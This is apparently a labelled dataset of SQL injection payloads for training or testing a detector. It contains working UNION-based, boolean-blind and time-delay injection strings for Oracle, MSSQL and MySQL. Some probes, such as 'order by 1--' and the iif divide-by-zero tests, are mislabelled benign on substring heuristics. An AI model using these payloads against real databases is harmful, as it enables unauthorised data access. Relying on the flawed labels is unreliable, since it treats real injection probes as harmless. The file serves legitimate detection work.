id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20495,"1' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 'ylql' like 'ylql",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20567,"1%' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20434,waitfor delay '0:0:5' and ( ( 'yjsp' like 'yjsp,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20456,"-6357"" ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
20464,"1' ) as afnt where 4719 = 4719 and elt ( 8224 = 1275,1275 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
20542,1' ) ) waitfor delay '0:0:5' and ( ( 'amnf' like 'amnf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20550,"-2418'|| ( select 'mdbt' from dual where 3026 = 3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
20564,"iif ( 7011 = 2522,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
20599,"iif ( 1378 = 6569,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
20405,"1 where 1326 = 1326 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
20407,"-2889 ) ) as iqzv where 1786 = 1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",union_based,generic,0.7,UNION-based payload detected. Payload length: 94 chars.,2
20420,"-3177' ) ) union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
20421,"-3130' ) ) ) union all select 2886,2886,2886,2886,2886,2886,2886#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20424,"1%"" ) ) and 6283 = 2068 and ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
20433,"-2766%' ) ) union all select 4458,4458,4458,4458,4458--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
20436,"-6360' ) as yfrk where 3683 = 3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",union_based,generic,0.7,UNION-based payload detected. Payload length: 97 chars.,2
20437,"1' in boolean mode ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
20447,"-1859' union all select 1781,1781,1781,1781#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
20451,-6081 where 3681 = 3681 or 2603 = 3138--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
20462,"-2216"" ) where 6692 = 6692 union all select 6692,6692,6692#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
20466,"1'+ ( select sxco where 1623 = 1623 union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
20468,1' where 3188 = 3188 and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
20469,"1'+ ( select 'eoxk' where 6621 = 6621 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20471,"1"" ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
20477,"1"" ) ) as qejm where 9014 = 9014 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
20478,-9556' ) where 2472 = 2472 or ( 2883 = 9968 ) *9968--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
20480,-8812 or 6872 = 6872# dflr,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
20486,"-9697 ) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20487,"-4068' ) ) ) union all select 9491,9491,9491--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
20490,1' where 7882 = 7882 and 6663 = 4524--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
20491,"1%"" ) ) ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
20493,"-6463"" ) ) ) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
20510,1' ) and 4380 = 5851 and ( 'cxcl' = 'cxcl,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
20511,-6757' ) ) ) or 4524 = 3696,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
20512,"1 ) where 4810 = 4810 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
20513,-6586' ) ) or 2021 = 2996,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
20514,"-4100' ) ) union all select 1163,1163,1163--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
